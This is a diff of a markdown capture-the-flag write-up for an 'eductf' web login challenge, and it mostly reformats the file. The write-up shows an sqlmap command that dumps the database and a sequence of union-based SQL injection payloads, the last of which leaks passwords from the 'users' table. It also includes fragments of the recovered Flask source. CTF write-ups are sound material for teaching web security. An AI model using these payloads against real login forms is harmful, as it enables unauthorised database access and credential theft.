@@ -11,16 +11,9 @@ date: 2023-02-13
 ###### tags: `CTF` `Web` `eductf`
 Challenge: https://login.ctf.zoolab.org/
 
-## Background
-
-## Source Code
-
-### Analysis
-
 ## Exploit - SQLi
-
 ### Easy way - `SQLmap`
-```bash!
+```bash
 $ ./sqlmap.py "https://login.ctf.zoolab.org/" --form -dbs sqlite --dump --risk=3 --level=5
 ...
 ---
@@ -33,16 +26,16 @@ Parameter: username (POST)
 
 ### Hard way - try&error
 1. Check if it has `sqli` problem
-Payload: `union'`
-![](https://i.imgur.com/xIfsghR.png)
+  * Payload: `union'`
+  ![](https://i.imgur.com/xIfsghR.png)
 
 2. Try union based
-Payload: `admin' union select 1 --` **→ WRONG**
-Payload: `admin' union select 1,2 --` **→ WRONG**
-Payload: `admin' union select 1,2,3 --` **→ WRONG**
-Payload: `admin' union select 1,2,3,4 --`
-![](https://i.imgur.com/3G8F2yP.png)
-Obviously, it shows some info when select 4 values
+  * Payload: `admin' union select 1 --` **→ WRONG**
+  * Payload: `admin' union select 1,2 --` **→ WRONG**
+  * Payload: `admin' union select 1,2,3 --` **→ WRONG**
+  * Payload: `admin' union select 1,2,3,4 --`
+  ![](https://i.imgur.com/3G8F2yP.png)
+  Obviously, it shows some info when select 4 values
 
 3. Must know the metadata
 According to the author, it used `sqlite` as its `DBMS`. As [kaibro cheat sheet](https://github.com/w181496/Web-CTF-Cheatsheet#sqlite)
@@ -56,14 +49,13 @@ According to the author, it used `sqlite` as its `DBMS`. As [kaibro cheat sheet]
     Based on the info we leak, there's a table named `users` with <font color="FF0000">`id`, `username`, `password`,and `count`</font> 4 columns
 
 4. Leak password
-Payload: `admin' union select 1,2,3,password FROM users --`
-![](https://i.imgur.com/p4d4Ep5.png)
+  * Payload: `admin' union select 1,2,3,password FROM users --`
+  ![](https://i.imgur.com/p4d4Ep5.png)
 
 
 ## Result
 Then we got source code!!!
-:::spoiler code
-```python=
+```python
 from flask import Flask, request, render_template, render_template_string, send_file
 from flask_sqlalchemy import SQLAlchemy
 
@@ -117,4 +109,3 @@ def index():
 if __name__ == "__main__":
   app.run(host="0.0.0.0")
 ```
-:::
